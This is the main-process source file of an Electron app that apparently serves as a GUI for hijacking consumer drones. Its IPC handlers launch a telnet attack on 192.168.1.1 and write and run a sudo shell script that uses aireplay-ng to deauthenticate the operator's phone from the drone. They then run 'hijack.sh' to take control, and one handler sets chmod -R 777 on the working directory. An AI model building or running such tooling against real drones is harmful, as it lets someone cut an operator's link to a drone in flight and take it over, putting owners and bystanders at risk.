/* eslint global-require: off, no-console: off, promise/always-return: off */

/**
 * This module executes inside of electron's main process. You can start
 * electron renderer process from here and communicate with the other processes
 * through IPC.
 *
 * When running `npm run build` or `npm run build:main`, this file is compiled to
 * `./src/main.js` using webpack. This gives us some performance wins.
 */
import path from 'path';
import { app, BrowserWindow, shell, ipcMain } from 'electron';
import { autoUpdater } from 'electron-updater';
import log from 'electron-log';
import MenuBuilder from './menu';
import { resolveHtmlPath } from './util';
const { Telnet } = require('telnet-client')
const connection = new Telnet()
const { cp, spawn, exec } = require('child_process');
const execFile = require('child_process').execFile;
const fs = require('fs')
var kill = require('tree-kill')

// var shell = require('shelljs')

const params = {
  host: '192.168.1.1',
  port: 23,
  shellPrompt: '/ # ', // or negotiationMandatory: false
  timeout: 1500
}

var hijack = null
var droneMacAddress = ""
var droneChannel = ""
var phoneMacAddress = ""

export default class AppUpdater {
  constructor() {
    log.transports.file.level = 'info';
    autoUpdater.logger = log;
    autoUpdater.checkForUpdatesAndNotify();
  }
}

let mainWindow: BrowserWindow | null = null;

ipcMain.on('ipc-example', async (event, arg) => {
  const msgTemplate = (pingPong: string) => `IPC test: ${pingPong}`;
  console.log(msgTemplate(arg));
  event.reply('ipc-example', msgTemplate('pong'));
});

if (process.env.NODE_ENV === 'production') {
  const sourceMapSupport = require('source-map-support');
  sourceMapSupport.install();
}

const isDevelopment =
  process.env.NODE_ENV === 'development' || process.env.DEBUG_PROD === 'false';

// if (isDevelopment) {
//   require('electron-debug')();
// }

const installExtensions = async () => {
  const installer = require('electron-devtools-installer');
  const forceDownload = !!process.env.UPGRADE_EXTENSIONS;
  const extensions = ['REACT_DEVELOPER_TOOLS'];

  return installer
    .default(
      extensions.map((name) => installer[name]),
      forceDownload
    )
    .catch(console.log);
};

const createWindow = async () => {
  if (isDevelopment) {
    await installExtensions();
  }

  const RESOURCES_PATH = app.isPackaged
    ? path.join(process.resourcesPath, 'assets')
    : path.join(__dirname, '../../assets');

  const getAssetPath = (...paths: string[]): string => {
    return path.join(RESOURCES_PATH, ...paths);
  };

  mainWindow = new BrowserWindow({
    show: false,
    width: 1024,
    height: 728,
    icon: getAssetPath('icon.png'),
    webPreferences: {
      // preload: path.join(__dirname, 'preload.js'),
      preload: "preload.js",
      nodeIntegration: true,
      contextIsolation: false,
    },
  });

  mainWindow.loadURL(resolveHtmlPath('index.html'));

  mainWindow.on('ready-to-show', () => {
    if (!mainWindow) {
      throw new Error('"mainWindow" is not defined');
    }
    if (process.env.START_MINIMIZED) {
      mainWindow.minimize();
    } else {
      mainWindow.show();
    }
  });

  mainWindow.on('closed', () => {
    mainWindow = null;
  });

  const menuBuilder = new MenuBuilder(mainWindow);
  menuBuilder.buildMenu();

  // Open urls in the user's browser
  mainWindow.webContents.setWindowOpenHandler((edata) => {
    shell.openExternal(edata.url);
    return { action: 'deny' };
  });

  // Remove this if your app does not use auto updates
  // eslint-disable-next-line
  new AppUpdater();
};

/**
 * Add event listeners...
 */

app.on('window-all-closed', () => {
  // Respect the OSX convention of having the application in memory even
  // after all windows have been closed
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

app
  .whenReady()
  .then(() => {
    createWindow();
    app.on('activate', () => {
      // On macOS it's common to re-create a window in the app when the
      // dock icon is clicked and there are no other windows open.
      if (mainWindow === null) createWindow();
    });
  })
  .catch(console.log);

ipcMain.on('tellatt', async (event, arg) => {
  console.log('Initiating telnet attack...')
  exec('./telatt', (err:any, stdout:any, stderr:any) => {
    if (err) {
      console.error(err)
      event.sender.send('failure', err)
    } else {
      if(stdout.includes("Connected")){
        console.log(stdout)
        console.log('Completed telnet attack successfully.')
        event.sender.send('completeTel')
      } else{
        console.log(stdout)
        console.log('Telnet attack unsuccessful. Please ensure you are connected to the drone\'s WiFi.')
        event.sender.send('failure')
      }
    }
  })
});

ipcMain.on('start', async (event, arg) => {
  const deauth1 = spawn('/bin/sh', ['-c', 'sudo ./deauth1.sh'])
  deauth1.stdout.on('data', (data) => {
      console.log(`${data}`)
  });
  deauth1.stderr.on('data', (data) => {
    console.error(`stderr: ${data}`);
  });
  deauth1.on('close', (code) => {
    console.log(`child process exited with code ${code} \n`);
  });
});

ipcMain.on('droneMAC', async (event, arg) => {
  droneMacAddress = arg
  console.log("DRONE MAC ADDRESS RECORDED: " + droneMacAddress + '\n')
});

ipcMain.on('droneChannel', async (event, arg) => {
  droneChannel = arg
  console.log("DRONE CHANNEL RECORDED: " + droneChannel + '\n')
});

ipcMain.on('phoneMAC', async (event, arg) => {
  phoneMacAddress = arg
  console.log("PHONE MAC ADDRESS RECORDED: " + phoneMacAddress + '\n')

  var content = "#!/bin/bash\naireplay-ng --deauth 35 -a "
  content += droneMacAddress + " -c " + phoneMacAddress + " wlp2s0mon\n"
  content +="airmon-ng stop wlp2s0mon\nservice network-manager start\nsystemctl restart networking\nservice network-manager start"

  fs.writeFileSync('attack.sh', content)
  const raisePermissions = spawn('/bin/sh', ['-c', 'chmod -R 777 ./'])

  const attack = spawn('/bin/sh', ['-c', 'sudo ./attack.sh'])
  console.log('Running deauth script...')
  var stdoutData = ""
  attack.stdout.on('data', (data) => {
      console.log(`${data}`)
      stdoutData = data
  });
  attack.stderr.on('data', (data) => {
    console.error(`stderr: ${data}`);
  });
  attack.on('close', (code) => {
    console.log(`child process exited with code ${code}`);
    //remove stdoutData.includes("no such bssid") for debugging purposes
    if(stdoutData.includes("Invalid") || stdoutData.includes("No such BSSID"))
      event.sender.send('failure')
    else
      event.sender.send('deauthDone')
  });
});

ipcMain.on('sendMac', async (event, arg) => {
  event.sender.send('droneMac', droneMacAddress)
  event.sender.send('droneChannel', droneChannel)
});

ipcMain.on('takecontrol', async (event, arg) => {
  hijack = spawn('/bin/sh', ['-c', 'sudo ./hijack.sh'], {stdio: [process.stdin, process.stdout, process.stderr]});
  await onExit(hijack);
});

ipcMain.on('finishHijack', async (event, arg) => {
  console.log('Hijack exited successfully.')
});

function onExit(childProcess: ChildProcess): Promise<void> {
  return new Promise((resolve, reject) => {
    childProcess.once('exit', (code: number, signal: string) => {
      if (code === 0) {
        resolve(undefined);
      } else {
        reject(new Error('Exit with error code: '+code));
      }
    });
    childProcess.once('error', (err: Error) => {
      reject(err);
    });
  });
}

//for later
// <div className="Hello">
//   <h2>Connection status: <Offline><span id="red">Offline</span></Offline><Online><span id="green">Online</span></Online></h2>
// </div>
